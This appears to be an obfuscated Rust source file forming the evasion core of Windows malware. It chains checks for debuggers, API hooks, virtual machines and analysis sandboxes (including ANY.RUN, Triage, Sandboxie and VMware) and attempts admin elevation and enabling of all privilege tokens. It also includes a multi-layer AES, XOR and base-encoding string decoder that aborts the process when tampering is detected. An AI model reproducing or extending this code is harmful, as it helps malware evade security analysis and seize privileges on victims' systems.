

use anti_debug_rust;
use anti_sandbox;
use anti_vm;
use crate::anti_debug_rust::bad_processes;
use crate::anti_debug_rust::blacklisted_windows;
use crate::anti_debug_rust::debugger_detection;
use crate::anti_debug_rust::hooks_detection;
use crate::anti_debug_rust::parent_anti_debug;
use crate::anti_debug_rust::run_debug_checks;
use crate::anti_sandbox::admin_check;
use crate::anti_sandbox::all_tokens;
use crate::anti_sandbox::clean_environment_detection;
use crate::anti_sandbox::critical_process;
use crate::anti_sandbox::internet_check;
use crate::anti_sandbox::pc_uptime;
use crate::anti_sandbox::recent_file_activity;
use crate::anti_sandbox::repetitive_process;
use crate::anti_sandbox::run_environment_checks;
use crate::anti_sandbox::running_processes;
use crate::anti_sandbox::runtime_detector;
use crate::anti_sandbox::usb_check;
use crate::anti_sandbox::username_check;
use crate::anti_vm::anyrun_detection;
use crate::anti_vm::comodo_antivirus_detection;
use crate::anti_vm::deep_freeze_detection;
use crate::anti_vm::hyperv_check;
use crate::anti_vm::kvm_check;
use crate::anti_vm::monitor_metrics;
use crate::anti_vm::parallels_check;
use crate::anti_vm::qemu_check;
use crate::anti_vm::run_vm_checks;
use crate::anti_vm::sandboxie_detection;
use crate::anti_vm::shadow_defender_detection;
use crate::anti_vm::triage_detection;
use crate::anti_vm::virtualbox_detection;
use crate::anti_vm::vm_artifacts;
use crate::anti_vm::vm_platform_check;
use crate::anti_vm::vmware_detection;
use windows::Win32::Foundation::*;
use windows::Win32::Security::*;
use windows::Win32::System::Diagnostics::Debug::*;
use windows::Win32::System::LibraryLoader::*;
use windows::Win32::System::ProcessStatus::*;
use windows::Win32::System::SystemInformation::*;
use windows::Win32::System::Threading::*;
use windows::Win32::System::Threading::PROCESS_NAME_FORMAT;
use windows::Win32::UI::WindowsAndMessaging::*;
use windows::Win32::UI::WindowsAndMessaging::SM_CXSCREEN;
use windows::Win32::UI::WindowsAndMessaging::SM_CYSCREEN;
use windows::core::*;

#[inline(never)]
fn checksum_pdt_atayzqukf(data: &[u8]) -> u64 {
    let mut a = 1u64;
    let mut b = 0u64;
    for &byte in data {
        a = (a.wrapping_add(byte as u64)) % 65521;
        b = (b.wrapping_add(a)) % 65521;
    }
    (b << 32) | a
}

fn decode_gsrqyw_gbqyvz(encrypted: &[u8], key: &[u8], expected_sum: u64) -> &'static str {
    let s: String = {
        use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
        use aes::{Aes128, Aes192, Aes256};
        use base85; // using base85 for base85 decoding
        use bs58; // using bs58 for base58 decoding
        use base64::{engine::general_purpose, Engine as _};

        if key.len() < 88 { return Box::leak(String::from_utf8_lossy(encrypted).to_string().into_boxed_str()); }

        let xor_key = &key[0..16];
        let aes192_key = &key[16..40];
        let aes128_key = &key[40..56];
        let aes256_key = &key[56..88];

        let mut data = encrypted.to_vec();

        let cipher256 = Aes256::new(GenericArray::from_slice(aes256_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher256.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher128 = Aes128::new(GenericArray::from_slice(aes128_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher128.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher192 = Aes192::new(GenericArray::from_slice(aes192_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher192.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        if !data.is_empty() {
            let pad_len = data[data.len() - 1] as usize;
            if pad_len <= 16 && pad_len <= data.len() {
                data.truncate(data.len() - pad_len);
            }
        }

        let xor_decoded: Vec<u8> = data.iter().enumerate().map(|(i, &b)| b ^ xor_key[i % xor_key.len()]).collect();
        let hex_str = match String::from_utf8(xor_decoded) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base64_bytes = match hex::decode(&hex_str) { Ok(b) => b, Err(_) => return Box::leak(hex_str.into_boxed_str()) };
        let base64_str = match String::from_utf8(base64_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base32_bytes = match general_purpose::STANDARD.decode(&base64_str) { Ok(b) => b, Err(_) => return Box::leak(base64_str.into_boxed_str()) };
        let base32_str = match String::from_utf8(base32_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base58_bytes = match base32::decode(base32::Alphabet::Rfc4648 { padding: true }, &base32_str) { Some(b) => b, None => return Box::leak(base32_str.into_boxed_str()) };
        let base58_str = match String::from_utf8(base58_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base85_bytes = match bs58::decode(&base58_str).into_vec() { Ok(b) => b, Err(_) => return Box::leak(base58_str.into_boxed_str()) };
        let base85_str = match String::from_utf8(base85_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base45_bytes = match base85::decode(&base85_str) { Ok(b) => b, Err(_) => return Box::leak(base85_str.into_boxed_str()) };
        let base45_str = match String::from_utf8(base45_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };

        match base45::decode(&base45_str) {
            Ok(final_bytes) => {
                let runtime_sum = checksum_pdt_atayzqukf(&final_bytes);
                if runtime_sum != expected_sum {
                    // Tampering detected! Simulated volatile write (to valid memory) then abort.
                    unsafe {
                        let mut dummy: u8 = 0;
                        std::ptr::write_volatile(&mut dummy, 1);
                    }
                    std::process::abort();
                }
                String::from_utf8_lossy(&final_bytes).to_string()
            },
            Err(_) => base45_str,
        }
    };
    Box::leak(s.into_boxed_str())
}

            pub fn qqyrv_d_ro () -> bool { if ! runtime_detector :: is_windows () { return false ; } if ! admin_check :: is_admin () { if let Err (_) = admin_check :: elevate_process () { } } if admin_check :: is_admin () { let _ = all_tokens :: enable () ; } fgz_qlox_a () } pub fn bxmgn_cmd () -> bool { if ! runtime_detector :: is_windows () { return false ; } if run_debug_checks () { return true ; } if run_vm_checks () { return true ; } if run_environment_checks () { return true ; } if luxjgvks () { return true ; } false } pub fn fgz_qlox_a () -> bool { if debugger_detection :: is_debugger_present () { println ! ("[anti_debug_rust] debugger_detection::is_debugger_present") ; return true ; } if debugger_detection :: check_remote_debugger () . unwrap_or (false) { println ! ("[anti_debug_rust] debugger_detection::check_remote_debugger") ; return true ; } if parent_anti_debug :: parent_anti_debug () { println ! ("[anti_debug_rust] parent_anti_debug::parent_anti_debug") ; return true ; } if pc_uptime :: check_uptime ((274 + 326)) . unwrap_or (false) { println ! ("[anti_sandbox] pc_uptime::check_uptime") ; return true ; } if bad_processes :: detect () . unwrap_or (false) { println ! ("[anti_debug_rust] bad_processes::detect") ; return true ; } if running_processes :: check_running_processes_count ((16 + 34)) . unwrap_or (false) { println ! ("[anti_sandbox] running_processes::check_running_processes_count") ; return true ; } if blacklisted_windows :: check_blacklisted_windows () { println ! ("[anti_debug_rust] blacklisted_windows::check_blacklisted_windows") ; return true ; } if hooks_detection :: detect_hooks_on_common_winapi_functions (None , None) { println ! ("[anti_debug_rust] hooks_detection::detect_hooks_on_common_winapi_functions") ; return true ; } if shadow_defender_detection :: detect_shadow_defender () { println ! ("[anti_vm] shadow_defender_detection::detect_shadow_defender") ; return true ; } if anyrun_detection :: anyrun_detection () . unwrap_or (false) { println ! ("[anti_sandbox] anyrun_detection::anyrun_detection") ; return true ; } if ! clean_environment_detection :: detect_clean_environment () { println ! ("[anti_sandbox] clean_environment_detection::detect_clean_environment (too clean)") ; return true ; } if comodo_antivirus_detection :: detect_comodo_antivirus () { println ! ("[anti_sandbox] comodo_antivirus_detection::detect_comodo_antivirus") ; return true ; } if deep_freeze_detection :: detect_deep_freeze () { println ! ("[anti_vm] deep_freeze_detection::detect_deep_freeze") ; return true ; } if hyperv_check :: detect_hyperv () . unwrap_or (false) { println ! ("[anti_vm] hyperv_check::detect_hyperv") ; return true ; } if kvm_check :: check_for_kvm () . unwrap_or (false) { println ! ("[anti_vm] kvm_check::check_for_kvm") ; return true ; } if monitor_metrics :: is_screen_small () . unwrap_or (false) { println ! ("[anti_sandbox] monitor_metrics::is_screen_small") ; return true ; } if parallels_check :: check_for_parallels () . unwrap_or (false) { println ! ("[anti_vm] parallels_check::check_for_parallels") ; return true ; } if qemu_check :: check_for_qemu () . unwrap_or (false) { println ! ("[anti_vm] qemu_check::check_for_qemu") ; return true ; } if recent_file_activity :: recent_file_activity_check () . unwrap_or (false) { println ! ("[anti_sandbox] recent_file_activity::recent_file_activity_check") ; return true ; } if repetitive_process :: check () . unwrap_or (false) { println ! ("[anti_sandbox] repetitive_process::check") ; return true ; } if sandboxie_detection :: detect_sandboxie () { println ! ("[anti_sandbox] sandboxie_detection::detect_sandboxie") ; return true ; } if triage_detection :: triage_check () . unwrap_or (false) { println ! ("[anti_sandbox] triage_detection::triage_check") ; return true ; } if usb_check :: plugged_in () . unwrap_or (true) == false { println ! ("[anti_sandbox] usb_check::plugged_in (no USB devices)") ; return true ; } if username_check :: check_for_blacklisted_names () { println ! ("[anti_sandbox] username_check::check_for_blacklisted_names") ; return true ; } if virtualbox_detection :: graphics_card_check () . unwrap_or (false) { println ! ("[anti_vm] virtualbox_detection::graphics_card_check") ; return true ; } if vm_artifacts :: vm_artifacts_detect () { println ! ("[anti_vm] vm_artifacts::vm_artifacts_detect") ; return true ; } if vm_platform_check :: detect_vm_platform () . unwrap_or (false) { println ! ("[anti_vm] vm_platform_check::detect_vm_platform") ; return true ; } if vmware_detection :: graphics_card_check () . unwrap_or (false) { println ! ("[anti_vm] vmware_detection::graphics_card_check") ; return true ; } if internet_check :: check_connection () . unwrap_or (true) == false { println ! ("[anti_sandbox] internet_check::check_connection") ; return true ; } false } pub fn luxjgvks () -> bool { bad_processes :: detect () . unwrap_or (false) || blacklisted_windows :: check_blacklisted_windows () } pub struct gwdzbkhl { pub enable_debug_checks : bool , pub enable_vm_checks : bool , pub enable_environment_checks : bool , pub enable_process_checks : bool , pub min_uptime_seconds : u32 , pub min_process_count : usize , pub min_installed_programs : usize , pub enable_internet_check : bool , pub enable_usb_check : bool , pub enable_admin_escalation : bool , pub enable_privilege_escalation : bool , pub enable_critical_process : bool , } impl Default for gwdzbkhl { fn default () -> Self { Self { enable_debug_checks : true , enable_vm_checks : true , enable_environment_checks : true , enable_process_checks : true , min_uptime_seconds : (8 + 592) , min_process_count : (22 + 28) , min_installed_programs : 10 , enable_internet_check : true , enable_usb_check : true , enable_admin_escalation : true , enable_privilege_escalation : true , enable_critical_process : true , } } } # [cfg (test)] mod tests { # [test] fn c_ws_jjioi () { println ! ("Detected OS: {:?}" , runtime_detector :: detect_os ()) ; assert_eq ! (runtime_detector :: is_windows () , cfg ! (windows)) ; } # [test] fn olloforu () { println ! ("Running as admin: {}" , admin_check :: is_admin ()) ; } # [test] fn mqvfqrqa () { println ! ("Debugger present: {}" , debugger_detection :: is_debugger_present ()) ; } # [test] fn vev_cmzi_w () { if let Ok (result) = debugger_detection :: check_remote_debugger () { println ! ("Remote debugger present: {}" , result) ; } } # [test] fn kaxbc_p_lq () { println ! ("Suspicious parent process: {}" , parent_anti_debug :: parent_anti_debug ()) ; } # [test] fn teyuwn_zt () { if let Ok (uptime) = pc_uptime :: get_uptime_in_seconds () { println ! ("System uptime: {} seconds" , uptime) ; } } # [test] fn ej_jmpa_ul () { if let Ok (count) = running_processes :: get_running_processes_count () { println ! ("Running processes: {}" , count) ; } } # [test] fn hvunw_qxv () { if let Ok (result) = bad_processes :: detect () { println ! ("Bad processes detected: {}" , result) ; } } # [test] fn xogelnjz () { println ! ("VM environment detected: {}" , run_vm_checks ()) ; } # [test] fn ubsorlah () { println ! ("Suspicious environment detected: {}" , run_environment_checks ()) ; } # [test] fn kfoy_puet () { if let Ok (connected) = internet_check :: check_connection () { println ! ("Internet connection available: {}" , connected) ; } } # [test] fn djckzxsl () { if let Ok (small_screen) = monitor_metrics :: is_screen_small () { println ! ("Small screen detected: {}" , small_screen) ; } } # [test] fn hvoiucwu () { println ! ("Blacklisted username: {}" , username_check :: check_for_blacklisted_names ()) ; } # [test] fn dpstzs_cc () { if let Ok (usb_detected) = usb_check :: plugged_in () { println ! ("USB devices detected: {}" , usb_detected) ; } } # [test] fn lbqntt_d_z () { println ! ("Clean environment (10+ programs): {}" , clean_environment_detection :: detect_clean_environment ()) ; } # [test] fn rkzlu_e_lu () { if admin_check :: is_admin () { match all_tokens :: enable () { Ok (_) => println ! ("Successfully enabled all available privileges") , Err (e) => println ! ("Failed to enable privileges: {}" , e) , } } else { println ! ("Not running as admin, cannot test privilege escalation") ; } } # [test] fn upn_o_eekw () { let detected = fgz_qlox_a () ; println ! ("Anti-analysis measures detected: {}" , detected) ; println ! ("Debug checks: {}" , run_debug_checks ()) ; println ! ("VM checks: {}" , run_vm_checks ()) ; println ! ("Environment checks: {}" , run_environment_checks ()) ; println ! ("Process checks: {}" , run_process_checks ()) ; } # [test] fn wcrhxola () { if runtime_detector :: is_windows () { let detected = bxmgn_cmd () ; println ! ("Windows-specific checks detected threats: {}" , detected) ; } else { println ! ("Not running on Windows, skipping Windows-specific tests") ; } } }